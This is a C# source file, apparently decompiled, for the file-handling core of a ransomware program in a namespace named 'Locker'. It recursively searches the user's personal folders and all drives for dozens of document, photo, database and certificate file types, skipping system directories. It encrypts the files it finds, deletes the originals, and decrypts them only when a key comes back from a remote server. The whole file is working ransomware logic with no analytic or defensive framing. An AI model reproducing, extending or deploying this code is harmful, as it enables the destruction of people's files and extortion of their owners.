using System;
using System.Collections.Generic;
using System.IO;

namespace Locker;

internal class TreeWalker
{
	private FileCryptor cryptor;

	private FileLockList filelocks;

	private int currentFileNumber;

	private readonly List<string> blacklistDirectories = new List<string> { "program files", "appdata", "programdata", "boot", "windows", "winnt", "recycle.bin" };

	private readonly List<string> extensions = new List<string>
	{
		".odt", ".ods", ".odp", ".odm", ".odc", ".odb", ".doc", ".docx", ".docm", ".wps",
		".xls", ".xlsx", ".xlsm", ".xlsb", ".xlk", ".ppt", ".pptx", ".pptm", ".mdb", ".accdb",
		".pst", ".dwg", ".dxf", ".dxg", ".wpd", ".rtf", ".wb2", ".mdf", ".dbf", ".psd",
		".pdd", ".pdf", ".eps", ".ai", ".indd", ".cdr", ".dng", ".3fr", ".arw", ".srf",
		".sr2", ".mp3", ".bay", ".crw", ".cr2", ".dcr", ".kdc", ".erf", ".mef", ".mrw",
		".nef", ".nrw", ".orf", ".raf", ".raw", ".rwl", ".rw2", ".r3d", ".ptx", ".pef",
		".srw", ".x3f", ".der", ".cer", ".crt", ".pem", ".pfx", ".p12", ".p7b", ".p7c",
		".jpg", ".png", ".jfif", ".jpeg", ".gif", ".bmp", ".exif", ".txt"
	};

	private FileLock prevEncryptedFile;

	public int FileCount => filelocks.Count;

	public int CurrentFileNumber => currentFileNumber;

	public void Search()
	{
		cryptor = new FileCryptor();
		filelocks = new FileLockList();
		filelocks.Initialize();
		if (filelocks.Count == 0)
		{
			DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.Personal));
			DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
			DirSearch(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				string name = driveInfo.Name;
				prevEncryptedFile = null;
				DirSearch(name);
			}
			filelocks.Save();
		}
	}

	public void Crypt()
	{
		CryptFiles();
	}

	public void Decrypt()
	{
		if (Program.server.GetKey() != null && filelocks.Count > 0 && (Program.server.GetKey().Key != null || Program.server.GetKey().Key != string.Empty))
		{
			DecryptFiles();
		}
	}

	public void RemoveFiles()
	{
		if (filelocks.Count <= 0)
		{
			return;
		}
		foreach (FileLock item in filelocks.GetList())
		{
			if (File.Exists(item.cryptedFileFullPath))
			{
				try
				{
					File.Delete(item.originalFileFullPath);
				}
				catch (Exception)
				{
				}
			}
		}
	}

	private void DecryptFiles()
	{
		currentFileNumber = 0;
		foreach (FileLock item in filelocks.GetList())
		{
			if (File.Exists(item.cryptedFileFullPath))
			{
				if (File.Exists(item.originalFileFullPath))
				{
					try
					{
						File.Delete(item.cryptedFileFullPath);
					}
					catch (Exception)
					{
					}
				}
				cryptor.DecryptFile(item);
				try
				{
					File.Delete(item.cryptedFileFullPath);
				}
				catch (Exception)
				{
				}
			}
			currentFileNumber++;
		}
	}

	private void CryptFiles()
	{
		currentFileNumber = 0;
		foreach (FileLock item in filelocks.GetList())
		{
			if (File.Exists(item.cryptedFileFullPath))
			{
				prevEncryptedFile = item;
				continue;
			}
			if (prevEncryptedFile != null && File.Exists(prevEncryptedFile.cryptedFileFullPath))
			{
				try
				{
					File.Delete(prevEncryptedFile.cryptedFileFullPath);
					cryptor.CryptFile(prevEncryptedFile);
				}
				catch (Exception ex)
				{
					Console.Write(ex.ToString());
				}
				prevEncryptedFile = null;
			}
			try
			{
				cryptor.CryptFile(item);
			}
			catch (Exception)
			{
			}
			currentFileNumber++;
		}
	}

	private void DirSearch(string sDir)
	{
		try
		{
			string[] files = Directory.GetFiles(sDir);
			string[] array = files;
			foreach (string text in array)
			{
				try
				{
					if (extensions.Contains(Path.GetExtension(text)))
					{
						if (filelocks.CurrentSize >= filelocks.MaxSize)
						{
							return;
						}
						FileInfo fileInfo = new FileInfo(text);
						if (fileInfo.Length <= 52428800L)
						{
							FileLock fileLock = new FileLock();
							fileLock.originalFileFullPath = text;
							filelocks.AddFile(fileLock);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(sDir);
			foreach (string text2 in directories)
			{
				bool flag = false;
				foreach (string blacklistDirectory in blacklistDirectories)
				{
					if (text2.ToLower().Contains(blacklistDirectory))
					{
						flag = true;
					}
				}
				if (!flag)
				{
					DirSearch(text2);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
